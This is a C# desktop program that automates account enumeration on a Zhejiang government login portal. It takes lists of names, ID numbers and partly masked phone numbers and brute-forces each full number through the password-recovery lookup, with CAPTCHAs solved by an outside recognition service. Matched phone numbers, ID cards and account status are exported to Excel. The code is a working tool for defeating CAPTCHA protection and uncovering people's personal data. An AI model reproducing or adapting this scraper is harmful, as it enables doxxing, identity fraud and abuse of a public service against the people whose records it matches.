using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using myDLL;

namespace 浙江号码匹配
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        #region  网络图片转Bitmap
        public Bitmap UrlToBitmap(string url)
        {
            WebClient mywebclient = new WebClient();
            mywebclient.Headers.Add("Cookie", cookie);
            byte[] Bytes = mywebclient.DownloadData(url);
            using (MemoryStream ms = new MemoryStream(Bytes))
            {
                Image outputImg = Image.FromStream(ms);

                Bitmap map = new Bitmap(outputImg);
                return map;
            }
        }
        #endregion

        #region POST请求

        public string PostUrl(string url, string postData)
        {
            try
            {
                System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; //获取不到加上这一条
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "Post";
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = postData.Length;
                //request.ContentLength = Encoding.UTF8.GetBytes(postData).Length;
                request.AllowAutoRedirect = false;
                request.Headers.Add("Cookie", cookie);
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36";
                request.Referer = "http://puser.zjzwfw.gov.cn/sso/newusp.do?action=forgotPwd&servicecode=zjdsjgrbs#";
                StreamWriter sw = new StreamWriter(request.GetRequestStream());
                sw.Write(postData);
                sw.Flush();

                HttpWebResponse response = request.GetResponse() as HttpWebResponse;  //获取反馈
                response.GetResponseHeader("Set-Cookie");
                StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding("utf-8")); //reader.ReadToEnd() 表示取得网页的源码流 需要引用 using  IO

                string html = reader.ReadToEnd();
                reader.Close();
                response.Close();
                return html;
            }
            catch (WebException ex)
            {

                MessageBox.Show(ex.ToString());
                return "";
            }


        }

        #endregion

        #region 图片转base64
        public static string ImgToBase64String(Bitmap bmp)
        {
            try
            {
                MemoryStream ms = new MemoryStream();
                bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                byte[] arr = new byte[ms.Length];
                ms.Position = 0;
                ms.Read(arr, 0, (int)ms.Length);
                ms.Close();
                return Convert.ToBase64String(arr);
            }
            catch
            {
                return null;
            }
        }

        #endregion

        public string shibie()
        {
            try
            {
                Bitmap image = UrlToBitmap("http://puser.zjzwfw.gov.cn/sso/usp.do?action=verifyimg");


              
                string param = "{\"username\":\""+textBox2.Text.Trim()+"\",\"password\":\""+ textBox3.Text.Trim() + "\",\"image\":\"" + ImgToBase64String(image) + "\"}";

                string PostResult = PostUrl("http://api.ttshitu.com/base64", param);

                Match result = Regex.Match(PostResult, @"result"":""([\s\S]*?)""");
                label1.Text = PostResult;
                return result.Groups[1].Value;
            }
            catch (Exception ex)
            {

                MessageBox.Show(ex.ToString());
                return "";
            }
        }

        string path = AppDomain.CurrentDomain.BaseDirectory;
        List<string> txtlist = new List<string>();
        public void gethaoduan()
        {

            StreamReader sr = new StreamReader(path+"浙江号段.txt", method.EncodingType.GetTxtType(path + "浙江号段.txt"));
            //一次性读取完 
            string texts = sr.ReadToEnd();
            string[] text = texts.Split(new string[] { "\r\n" }, StringSplitOptions.None);
            for (int i = 0; i < text.Length; i++)
            {

                txtlist.Add(text[i]);
            }

            textBox1.Text = DateTime.Now.ToLongTimeString() + ": 号段加载完成";

        }
        public List<string> fanhuihaoduan(string value )
        {
            List<string> list = new List<string>();
            foreach (var item in txtlist)
            {
                if (item.Trim().Length > 3)
                {
                    if (item.Substring(0, 3) == value)
                    {
                        list.Add(item);
                    }
                }
            }



            return list;
        }


        public string getloginname(string card)
        {
            cookie = method.GetCookies("http://puser.zjzwfw.gov.cn/sso/usp.do?action=verifyimg");
            string yanzhengma = shibie();
            string url = "http://puser.zjzwfw.gov.cn/sso/newusp.do";
            string postdata = "action=getUserid&loginname=" +card + "&verifycode=" + yanzhengma;
            string html = PostUrl(url, postdata);
            while (html == "{\"result\":-1}")
            {
              
                yanzhengma = shibie();
                postdata = "action=getUserid&loginname=" + card + "&verifycode=" + yanzhengma;
                html = PostUrl(url, postdata);
            }
            string loginname = Regex.Match(html, @"""loginname"":""([\s\S]*?)""").Groups[1].Value;
            string authLevel = Regex.Match(html, @"""authLevel"":""([\s\S]*?)""").Groups[1].Value;
            if (loginname != "")
            {
               
                return loginname + authLevel;
            }
            else
            {
                return "";
               
            }
           
        }
        public void run()
        {
            textBox1.Text = DateTime.Now.ToLongTimeString() + ": 开始查询";
            cookie = method.GetCookies("http://puser.zjzwfw.gov.cn/sso/usp.do?action=verifyimg");
            

            try
            {
                List<string> list = new List<string>();
                for (int i = 0; i <listView2.Items.Count; i++)
                {
                    string name = listView2.Items[i].SubItems[0].Text;
                    string idcard = listView2.Items[i].SubItems[1].Text;
                    string phone = listView2.Items[i].SubItems[2].Text;
                    string loginnameauthLevel = getloginname(idcard);
                    try
                    {
                       
                        string phoneq3 = phone.Substring(0,3);
                        string phoneh4 = phone.Substring(phone.Length-4, 4);
                        list = fanhuihaoduan(phoneq3);
                        int all = list.Count;
                       
                        for (int a= 0; a < list.Count; a++)
                        {
                           

                            try
                            {
                                string phonehalf = list[a];
                            string phonefull = phonehalf + phoneh4;
                                textBox1.Text = "当前号码匹配共" + list.Count.ToString() + "剩余：" + all.ToString() + "正在查询："+ phonefull;
                                string yanzhengma = shibie();
                            string url = "http://puser.zjzwfw.gov.cn/sso/newusp.do";
                            string postdata = "action=getUserid&loginname=" + phonefull + "&verifycode=" + yanzhengma;
                            string html = PostUrl(url, postdata);

                                if (html.Contains("-2"))
                                {
                                    all = all - 1;
                                    continue;
                                }
                                else if (html.Contains("-1"))
                                {
                                    a = a - 1;
                                    continue;
                                }
                                else
                                {
                                    
                                    string card = Regex.Match(html, @"""idcard"":""([\s\S]*?)""").Groups[1].Value;
                                    if (card.Length > 1)
                                    {
                                        if (card.Substring(0, 1) == idcard.Substring(0, 1) && card.Substring(card.Length - 1, 1) == idcard.Substring(idcard.Length - 1, 1))

                                        {
                                            string zfb = "false";
                                            string loginname = Regex.Match(html, @"""loginname"":""([\s\S]*?)""").Groups[1].Value;
                                            string authLevel = Regex.Match(html, @"""authLevel"":""([\s\S]*?)""").Groups[1].Value;
                                            if (loginnameauthLevel == loginname + authLevel)
                                            {
                                                zfb = "true";
                                            }
                                         

                                            ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count).ToString()); //使用Listview展示数据   
                                            lv1.SubItems.Add(name);
                                            lv1.SubItems.Add(idcard);
                                            lv1.SubItems.Add(phonefull);
                                            lv1.SubItems.Add(zfb);
                                            while (this.zanting == false)
                                            {
                                                Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
                                            }

                                            if (status == false)
                                                return;
                                            if (zfb == "true")
                                                break;
                                            Thread.Sleep(20);
                                          
                                        }


                                    }
                                   
                                    
                                }

                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.ToString());
                                continue;
                                
                            }
                        }

                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                        continue;

                      
                    }






                }

            }
            catch (Exception ex)
            {

                MessageBox.Show(ex.ToString());
            }
        }
        bool status = true;
        bool zanting = true;
        string cookie = "";
        Thread thread;
        private void Form1_Load(object sender, EventArgs e)
        {

            Thread thread = new Thread(gethaoduan);
                thread.Start();
                Control.CheckForIllegalCrossThreadCalls = false;
            

            WebBrowser web = new WebBrowser();
            web.Navigate("http://puser.zjzwfw.gov.cn/sso/usp.do?action=verifyimg");
        }

        private void button4_Click(object sender, EventArgs e)
        {
            method.DataTableToExcel(method.listViewToDataTable(this.listView1), "Sheet1", true);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            #region 通用检测

            string html = method.GetUrl("http://www.acaiji.com:8080/api/vip.html", "utf-8");

            if (!html.Contains(@"VoWQXT"))
            {
               
                return;
            }



            #endregion
            status = true;
            if (thread == null || !thread.IsAlive)
            {
                thread = new Thread(run);
                thread.Start();
                Control.CheckForIllegalCrossThreadCalls = false;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
          
            if (zanting == false)
            {

                zanting = true;
            }
            else
            {
                zanting = false;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            status = false;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
        }
        
        private void button6_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.Title = "打开excel文件";
            // openFileDialog1.Filter = "excel03文件(*.xls)|*.xls|excel07文件(*.xlsx)|*.xlsx";
            openFileDialog1.Filter = "excel07文件(*.xlsx)|*.xlsx";
            openFileDialog1.InitialDirectory = @"C:\Users\Administrator\Desktop";
            openFileDialog1.RestoreDirectory = true;
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
               
                //打开文件对话框选择的文件
                textBox1.Text = "正在读取表格数据.......";
                DataTable dt = method.ExcelToDataTable(openFileDialog1.FileName, true);
                thread = new Thread(delegate() { method.ShowDataInListView(dt, listView2); });
                thread.Start();
                Control.CheckForIllegalCrossThreadCalls = false;
              
                textBox1.Text = "读取表格数据成功！";
                button1.Enabled = true;
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
    }
}
